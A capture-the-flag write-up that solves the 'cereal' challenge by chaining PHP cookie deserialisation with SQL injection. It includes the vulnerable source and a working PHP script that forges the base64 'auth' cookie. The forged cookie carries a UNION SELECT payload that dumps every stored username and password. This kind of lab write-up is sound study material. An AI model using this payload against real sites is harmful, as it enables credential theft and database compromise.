# cereal
on opening the website, we see the front page looks like - 
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/e9c912be-6d72-4ea4-a22b-979178f51398)
here we see that we just need to put ```guest``` as username and ```password``` as password. 

In the source code, we can see that - 
```
<form action="authenticate.php" method="post">
				<label for="username">
					<i class="fas fa-user"></i>
				</label>
				<input type="text" name="username" placeholder="Username" id="username" required>
				<label for="password">
					<i class="fas fa-lock"></i>
				</label>
				<input type="password" name="password" placeholder="Password" id="password" required>
				<input type="submit" value="Login">
			</form>
```
the form leads to the input being sent to ```authenticate.php```
In authenticate.php, we see
```
$conn = new PDO('sqlite:../important.db');
$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$query = "select * from users where `username` = :username AND `password` = :password";
$stmt = $conn->prepare($query);
$stmt->bindParam(':username', $username);
$stmt->bindParam(':password', $password);
```
username and password fields are safe from sqli in the login form.
then we also can see - 
```	setcookie($cookie_name, base64_encode(serialize($cookie)), time() + (86400 * 30), "/");```
here a new object of User class is initialised, serialised, base64 encoded and set as cookie. We can see a cookie with the name 'auth'
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/895de73b-1969-4d32-9ddf-72764971755a)
this holds the value of the base64 encoded serialized object.

Here we can see a clear <a href="https://medium.com/swlh/exploiting-php-deserialization-56d71f03282a">php deserialisation</a> vulnerability. Now we need to find a method to make use of this vulnerability.
`home.php` has nothing interesting in it.
However, if we see `profile.php`
we see 
```
$cookie = unserialize(base64_decode($_COOKIE['auth']));
$row = $cookie->sendProfile();

$username = $row[0];
$email = $row[1];
$cereal = $row[2];
$date = date('Y-m-d H:i:s', $row[3]);
```
and
```
				<p>Your account details are below:</p>
				<table>
					<tr>
						<td>Username:</td>
						<td><?=htmlspecialchars($username, ENT_QUOTES)?></td>
					</tr>
					<tr>
						<td>Email:</td>
						<td><?=htmlspecialchars($email, ENT_QUOTES)?></td>
					</tr>
					<tr>
						<td>Account Creation Date:</td>
						<td><?=htmlspecialchars($date, ENT_QUOTES)?></td>
					</tr>
					<tr>
						<td>Favorite Cereal:</td>
						<td><?=htmlspecialchars($cereal, ENT_QUOTES)?></td>
					</tr>
				</table>
```

here we can see that details are being fetched and diplayed. But how?
in config.php, we see
```
public function refresh() {
	// Database connection
	$conn = new PDO('sqlite:../important.db');
	$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	$query = "select username, email, favorite_cereal, creation_date from users where `id` = '" . $this->id . "' AND `username` = '" . $this->username . "'";
	$stmt = $conn->prepare($query);
	$stmt->execute();
	$row = $stmt->fetch();

	$this->profile = $row;
}
```
here, we can see username and id are values that are vulnerable to sqli, however we also see later in config.php that - 
```
public function validate() {
	// Database connection
	$conn = new PDO('sqlite:../important.db');
	$conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
	$query = "select * from users where `username` = :username";
	$stmt = $conn->prepare($query);
	$stmt->bindParam(':username', $this->username);
	$stmt->execute();
	$row = $stmt->fetch();

	if (md5($row['password']) !== $this->password) {
		header('Location: logout.php');
		exit;
	}
}
```
username is not vulnerable to sqli since it is checked twice to make sure the username entered is valid. Hence now we know where to do the sqli while exploiting the deserialisation vulerability.

# solve
I made another class, similar to the `User` class in php and serialized it using the script -
```
<?php
class User {
  public $username = '';
        public $id = -1;
        protected $password = '';
        protected $profile;

        function __construct(){
            $this->username="guest";
            $this->id="3' union select group_concat(username),group_concat(password),group_concat(favorite_cereal),creation_date from users -- #";
            $this->password="5f4dcc3b5aa765d61d8327deb882cf99";
        }
}

$u1= new User();
print(base64_encode(serialize($u1)));
?>
```
here in the `id` field, sqli is done. only the `group_concat(password)` part is relevant, I added the rest to make things look *nice* and match the number of columns being selected. Finally, I used `--` to comment out the rest of the line.
`password` variable is set to md5 hash of the string "password" since that is one of the fields that get selected for username validation and without this, the validiation will fail.

I set the output of this script as `auth` cookie - 
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/bc93b69a-43b9-467f-9d55-e5ce675e2130)
Finally I get the flag - 
![image](https://github.com/Ryuou02/ctf-writeups/assets/133224167/74dc4528-ef05-4b48-a323-6b3614b2373d)

